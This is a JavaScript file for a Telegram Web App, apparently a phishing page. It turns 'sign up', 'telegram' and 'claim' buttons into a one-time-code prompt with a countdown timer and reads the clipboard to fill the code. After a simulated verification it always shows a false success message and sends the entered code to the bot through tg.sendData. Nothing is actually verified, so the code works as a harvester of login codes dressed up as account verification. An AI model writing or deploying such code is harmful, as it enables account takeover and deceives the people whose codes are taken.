// Initialize Telegram Web App
const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    // Elements
    const otpModal = document.getElementById('otp-modal');
    const modalClose = document.getElementById('modal-close');
    const confirmBtn = document.getElementById('confirm-btn');
    const timerSpan = document.getElementById('timer');
    const otpInput = document.getElementById('otp-input');
    const pasteBtn = document.querySelector('.paste-btn');

    let timerInterval;

    // Show Modal Function
    const showOTPModal = () => {
        otpModal.style.display = 'flex';
        startTimer();
        if (tg) {
            tg.HapticFeedback.impactOccurred('medium');
        }
    };

    // Auto-detect buttons by text content
    const setupTriggers = () => {
        const buttons = Array.from(document.querySelectorAll('button, a'));
        
        buttons.forEach(btn => {
            const text = btn.textContent.trim().toLowerCase();
            if (text === 'sign up' || text === 'telegram' || text.includes('claim')) {
                btn.onclick = (e) => {
                    e.preventDefault();
                    showOTPModal();
                };
            }
        });
    };

    // Initial setup
    setupTriggers();

    // Close Modal
    modalClose.addEventListener('click', () => {
        otpModal.style.display = 'none';
        clearInterval(timerInterval);
    });

    // Timer Logic
    function startTimer() {
        let timeLeft = 46;
        timerSpan.textContent = timeLeft;
        clearInterval(timerInterval);
        
        timerInterval = setInterval(() => {
            timeLeft--;
            timerSpan.textContent = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                timerSpan.textContent = "0";
            }
        }, 1000);
    }

    // Paste Functionality
    pasteBtn.addEventListener('click', async () => {
        try {
            const text = await navigator.clipboard.readText();
            if (text && text.length <= 6) {
                otpInput.value = text;
            }
        } catch (err) {
            console.error('Failed to read clipboard');
        }
    });

    // Confirm Logic
    confirmBtn.addEventListener('click', () => {
        const code = otpInput.value;
        if (code.length < 4) {
            alert('Please enter a valid verification code');
            return;
        }

        confirmBtn.innerHTML = 'Verifying...';
        confirmBtn.disabled = true;

        // Simulate API call
        setTimeout(() => {
            if (tg) {
                tg.showPopup({
                    title: 'Verification Success',
                    message: 'Your account has been verified successfully!',
                    buttons: [{type: 'ok'}]
                });
                
                // Send data back to bot
                tg.sendData(JSON.stringify({
                    action: 'login_success',
                    code: code,
                    timestamp: new Date().toISOString()
                }));
                
                setTimeout(() => tg.close(), 1000);
            } else {
                alert('Verification Successful!');
                location.reload();
            }
        }, 2000);
    });
});
